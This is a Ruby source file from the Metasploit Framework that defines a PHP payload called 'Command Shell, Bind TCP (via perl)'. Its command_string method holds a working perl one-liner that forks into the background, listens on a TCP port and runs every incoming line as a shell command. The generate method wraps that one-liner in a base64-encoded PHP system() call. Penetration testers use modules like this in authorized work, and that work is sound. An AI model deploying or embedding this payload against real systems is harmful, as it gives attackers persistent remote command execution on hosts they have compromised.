##
# $Id: bind_perl.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Bind TCP (via perl)',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
			'Author'        => ['Samy <samy@samy.pl>', 'cazz'],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'))"
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string

		cmd = "perl -MIO -e '$p=fork();exit,if$p;while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'"

		return cmd
	end

end